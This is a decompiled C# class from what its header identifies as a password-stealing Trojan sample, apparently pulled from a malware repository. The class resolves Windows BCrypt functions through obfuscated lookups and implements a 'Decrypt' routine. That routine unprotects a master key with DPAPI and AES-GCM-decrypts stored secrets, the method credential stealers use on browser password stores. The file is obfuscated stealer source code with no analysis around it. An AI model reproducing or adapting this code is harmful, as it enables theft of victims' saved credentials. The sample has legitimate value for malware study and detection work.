// Decompiled with JetBrains decompiler
// Type: EntityReader
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class EntityReader
{
  public EntityReader() => this.LibPtr = ConditionCollection.RegisterFile(PaneList.RegisterFile(Menu.RegisterFile(), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(1828), StreamProvider.RegisterFile(1901), string.Empty)));

  private IntPtr LibPtr { get; }

  public uint D_1(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags) => ReferenceTable.RegisterFile((object) MemoryImport.Func<EntityReader.StoreEventArgs>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(851), StreamProvider.RegisterFile(942), string.Empty))), out phAlgorithm, pszAlgId, pszImplementation, dwFlags);

  public uint D_2(IntPtr hAlgorithm, uint flags) => ToolbarToken.RegisterFile((object) MemoryImport.Func<EntityReader.ActivityContext>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(955), StreamProvider.RegisterFile(1066), string.Empty))), hAlgorithm, flags);

  public uint D_3(
    IntPtr hKey,
    byte[] pbInput,
    int cbInput,
    ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
    byte[] pbIV,
    int cbIV,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    int dwFlags)
  {
    return ToolbarProvider.RegisterFile((object) MemoryImport.Func<EntityReader.ComponentType>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(1085), StreamProvider.RegisterFile(1136), string.Empty))), hKey, pbInput, cbInput, ref pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, ref pcbResult, dwFlags);
  }

  public uint D_4(IntPtr hKey) => StoreOptions.RegisterFile((object) MemoryImport.Func<EntityReader.GroupLoader>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(1149), StreamProvider.RegisterFile(1248), string.Empty))), hKey);

  public uint D_5(
    IntPtr hObject,
    [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    uint flags)
  {
    return MenuItemService.RegisterFile((object) MemoryImport.Func<EntityReader.PcitureLayout>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(1271), StreamProvider.RegisterFile(1348), string.Empty))), hObject, pszProperty, pbOutput, cbOutput, ref pcbResult, flags);
  }

  public uint D_6(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags) => ImageSet.RegisterFile((object) MemoryImport.Func<EntityReader.DirectoryService>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(1363), StreamProvider.RegisterFile(1495), string.Empty))), hObject, pszProperty, pbInput, cbInput, dwFlags);

  public uint D_7(
    IntPtr hAlgorithm,
    IntPtr hImportKey,
    [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
    out IntPtr phKey,
    IntPtr pbKeyObject,
    int cbKeyObject,
    byte[] pbInput,
    int cbInput,
    uint dwFlags)
  {
    return ServerManager.RegisterFile((object) MemoryImport.Func<EntityReader.DialogQueue>(MenuSet.RegisterFile(StreamLayout.RegisterFile((object) this), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(1520), StreamProvider.RegisterFile(1593), string.Empty))), hAlgorithm, hImportKey, pszBlobType, out phKey, pbKeyObject, cbKeyObject, pbInput, cbInput, dwFlags);
  }

  public static string Decrypt(byte[] bMasterKey, string chiperText)
  {
    Encoding pathList = XmlFileEditor.RegisterFile(StreamProvider.RegisterFile(1608));
    byte[] numArray = new byte[bMasterKey.Length - TemplateService.RegisterFile(1436)];
    LineSettings.RegisterFile((Array) bMasterKey, TemplateService.RegisterFile(1440), (Array) numArray, TemplateService.RegisterFile(1444), bMasterKey.Length - TemplateService.RegisterFile(1448));
    byte[] generatorCache = PaneConverter.RegisterFile(numArray, (DataProtectionScope) TemplateService.RegisterFile(1452));
    return MethodFactory.RegisterFile((object) pathList, EntityReader.RegisterFile(PackageService.RegisterFile((object) pathList, chiperText), generatorCache));
  }

  private static byte[] RegisterFile(byte[] pathList, byte[] generatorCache)
  {
    byte[] pathList1 = new byte[TemplateService.RegisterFile(1456)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList1, __fieldref (VectorContext.previousHandler));
    byte[] numArray1 = pathList1;
    LineSettings.RegisterFile((Array) pathList, TemplateService.RegisterFile(1460), (Array) numArray1, TemplateService.RegisterFile(1464), TemplateService.RegisterFile(1468));
    try
    {
      byte[] numArray2 = new byte[pathList.Length - TemplateService.RegisterFile(1472)];
      LineSettings.RegisterFile((Array) pathList, TemplateService.RegisterFile(1476), (Array) numArray2, TemplateService.RegisterFile(1480), pathList.Length - TemplateService.RegisterFile(1484));
      byte[] numArray3 = new byte[TemplateService.RegisterFile(1488)];
      byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
      LineSettings.RegisterFile((Array) numArray2, numArray2.Length - TemplateService.RegisterFile(1492), (Array) numArray3, TemplateService.RegisterFile(1496), TemplateService.RegisterFile(1500));
      LineSettings.RegisterFile((Array) numArray2, TemplateService.RegisterFile(1504), (Array) numArray4, TemplateService.RegisterFile(1508), numArray2.Length - numArray3.Length);
      return ConnectionSettings.RegisterFile().RegisterFile(generatorCache, numArray1, (byte[]) null, numArray4, numArray3);
    }
    catch (Exception ex)
    {
    }
    return (byte[]) null;
  }

  private byte[] RegisterFile(
    byte[] pathList,
    byte[] generatorCache,
    byte[] previousHandler,
    byte[] namesEnabled,
    byte[] valuesMap)
  {
    IntPtr num1 = this.RegisterFile(StreamProvider.RegisterFile(1633), StreamProvider.RegisterFile(1640), StreamProvider.RegisterFile(1697));
    IntPtr previousHandler1;
    IntPtr pathList1 = this.RegisterFile(num1, pathList, out previousHandler1);
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authenticatedCipherModeInfo;
    PackageDictionary.RegisterFile(ref authenticatedCipherModeInfo, generatorCache, previousHandler, valuesMap);
    byte[] activeValues;
    using (authenticatedCipherModeInfo)
    {
      byte[] addressCount = new byte[this.RegisterFile(num1)];
      int parentQuery = TemplateService.RegisterFile(1512);
      if (ProjectHelper.RegisterFile((object) this, previousHandler1, namesEnabled, namesEnabled.Length, ref authenticatedCipherModeInfo, addressCount, addressCount.Length, (byte[]) null, TemplateService.RegisterFile(1516), ref parentQuery, TemplateService.RegisterFile(1520)) != 0U)
      {
label_2:
        switch (6)
        {
          case 0:
            goto label_2;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (EntityReader.RegisterFile);
            }
            throw IconInvoker.RegisterFile();
        }
      }
      else
      {
        activeValues = new byte[parentQuery];
        int num2 = (int) ProjectHelper.RegisterFile((object) this, previousHandler1, namesEnabled, namesEnabled.Length, ref authenticatedCipherModeInfo, addressCount, addressCount.Length, activeValues, activeValues.Length, ref parentQuery, TemplateService.RegisterFile(1524));
        if (num2 == TemplateService.RegisterFile(1528))
        {
label_7:
          switch (2)
          {
            case 0:
              goto label_7;
            default:
              throw IconInvoker.RegisterFile();
          }
        }
        else if (num2 != 0)
        {
label_10:
          switch (2)
          {
            case 0:
              goto label_10;
            default:
              throw IconInvoker.RegisterFile();
          }
        }
      }
    }
    int num3 = (int) FormContext.RegisterFile((object) this, previousHandler1);
    ControlQueue.RegisterFile(pathList1);
    int num4 = (int) DialogLoader.RegisterFile((object) this, num1, (uint) TemplateService.RegisterFile(1532));
    return activeValues;
  }

  private int RegisterFile(IntPtr pathList)
  {
    byte[] numArray = this.RegisterFile(pathList, StreamProvider.RegisterFile(1728));
    byte[] pathList1 = new byte[TemplateService.RegisterFile(1536)];
    pathList1[TemplateService.RegisterFile(1540)] = numArray[TemplateService.RegisterFile(1544)];
    pathList1[TemplateService.RegisterFile(1548)] = numArray[TemplateService.RegisterFile(1552)];
    pathList1[TemplateService.RegisterFile(1556)] = numArray[TemplateService.RegisterFile(1560)];
    pathList1[TemplateService.RegisterFile(1564)] = numArray[TemplateService.RegisterFile(1568)];
    return ImageHelper.RegisterFile(pathList1, TemplateService.RegisterFile(1572));
  }

  private IntPtr RegisterFile(string pathList, string generatorCache, string previousHandler)
  {
    IntPtr generatorCache1 = IntPtr.Zero;
    if (DialogLayout.RegisterFile((object) this, out generatorCache1, pathList, generatorCache, (uint) TemplateService.RegisterFile(1576)) != 0U)
    {
label_1:
      switch (4)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (EntityReader.RegisterFile);
          }
          throw IconInvoker.RegisterFile();
      }
    }
    else
    {
      byte[] namesEnabled = PackageService.RegisterFile((object) DriveSite.RegisterFile(), previousHandler);
      if (BookmarkService.RegisterFile((object) this, generatorCache1, StreamProvider.RegisterFile(1755), namesEnabled, namesEnabled.Length, TemplateService.RegisterFile(1580)) == 0U)
        return generatorCache1;
label_6:
      switch (1)
      {
        case 0:
          goto label_6;
        default:
          throw IconInvoker.RegisterFile();
      }
    }
  }

  private IntPtr RegisterFile(
    IntPtr pathList,
    byte[] generatorCache,
    out IntPtr previousHandler)
  {
    int num = ImageHelper.RegisterFile(this.RegisterFile(pathList, StreamProvider.RegisterFile(1780)), TemplateService.RegisterFile(1584));
    IntPtr addressCount = ResourceInvoker.RegisterFile(num);
    byte[][] numArray = new byte[TemplateService.RegisterFile(1588)][];
    numArray[TemplateService.RegisterFile(1592)] = ReferenceTree.RegisterFile(TemplateService.RegisterFile(1596));
    numArray[TemplateService.RegisterFile(1600)] = ReferenceTree.RegisterFile(TemplateService.RegisterFile(1604));
    numArray[TemplateService.RegisterFile(1608)] = ReferenceTree.RegisterFile(generatorCache.Length);
    numArray[TemplateService.RegisterFile(1612)] = generatorCache;
    byte[] activeValues = MethodStack.RegisterFile((object) this, numArray);
    if (FileSet.RegisterFile((object) this, pathList, IntPtr.Zero, StreamProvider.RegisterFile(1805), out previousHandler, addressCount, num, activeValues, activeValues.Length, (uint) TemplateService.RegisterFile(1616)) == 0U)
      return addressCount;
label_1:
    switch (4)
    {
      case 0:
        goto label_1;
      default:
        if (false)
        {
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (EntityReader.RegisterFile);
        }
        throw IconInvoker.RegisterFile();
    }
  }

  private byte[] RegisterFile(IntPtr pathList, string generatorCache)
  {
    int addressCount = TemplateService.RegisterFile(1620);
    if (ClientStack.RegisterFile((object) this, pathList, generatorCache, (byte[]) null, TemplateService.RegisterFile(1624), ref addressCount, (uint) TemplateService.RegisterFile(1628)) != 0U)
    {
label_1:
      switch (4)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (EntityReader.RegisterFile);
          }
          throw IconInvoker.RegisterFile();
      }
    }
    else
    {
      byte[] namesEnabled = new byte[addressCount];
      if (ClientStack.RegisterFile((object) this, pathList, generatorCache, namesEnabled, namesEnabled.Length, ref addressCount, (uint) TemplateService.RegisterFile(1632)) == 0U)
        return namesEnabled;
label_6:
      switch (6)
      {
        case 0:
          goto label_6;
        default:
          throw IconInvoker.RegisterFile();
      }
    }
  }

  public byte[] Concat(params byte[][] arrays)
  {
    int num = TemplateService.RegisterFile(1636);
    byte[][] numArray1 = arrays;
    for (int index = TemplateService.RegisterFile(1640); index < numArray1.Length; index += TemplateService.RegisterFile(1644))
    {
      byte[] numArray2 = numArray1[index];
      if (numArray2 != null)
      {
label_2:
        switch (3)
        {
          case 0:
            goto label_2;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (EntityReader.Concat);
            }
            num += numArray2.Length;
            continue;
        }
      }
    }
label_8:
    switch (3)
    {
      case 0:
        goto label_8;
      default:
        byte[] previousHandler = new byte[num - TemplateService.RegisterFile(1648) + TemplateService.RegisterFile(1652)];
        int namesEnabled = TemplateService.RegisterFile(1656);
        byte[][] numArray3 = arrays;
        for (int index = TemplateService.RegisterFile(1660); index < numArray3.Length; index += TemplateService.RegisterFile(1668))
        {
          byte[] pathList = numArray3[index];
          if (pathList != null)
          {
label_11:
            switch (2)
            {
              case 0:
                goto label_11;
              default:
                PcitureSerializer.RegisterFile((Array) pathList, TemplateService.RegisterFile(1664), (Array) previousHandler, namesEnabled, pathList.Length);
                namesEnabled += pathList.Length;
                continue;
            }
          }
        }
label_15:
        switch (5)
        {
          case 0:
            goto label_15;
          default:
            return previousHandler;
        }
    }
  }

  private delegate uint StoreEventArgs(
    out IntPtr phAlgorithm,
    [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
    [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
    uint dwFlags);

  private delegate uint ActivityContext(IntPtr hAlgorithm, uint flags);

  private delegate uint PcitureLayout(
    IntPtr hObject,
    [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    uint flags);

  private delegate uint DirectoryService(
    IntPtr hObject,
    [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
    byte[] pbInput,
    int cbInput,
    int dwFlags);

  private delegate uint DialogQueue(
    IntPtr hAlgorithm,
    IntPtr hImportKey,
    [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
    out IntPtr phKey,
    IntPtr pbKeyObject,
    int cbKeyObject,
    byte[] pbInput,
    int cbInput,
    uint dwFlags);

  private delegate uint GroupLoader(IntPtr hKey);

  private delegate uint ComponentType(
    IntPtr hKey,
    byte[] pbInput,
    int cbInput,
    ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
    byte[] pbIV,
    int cbIV,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    int dwFlags);
}
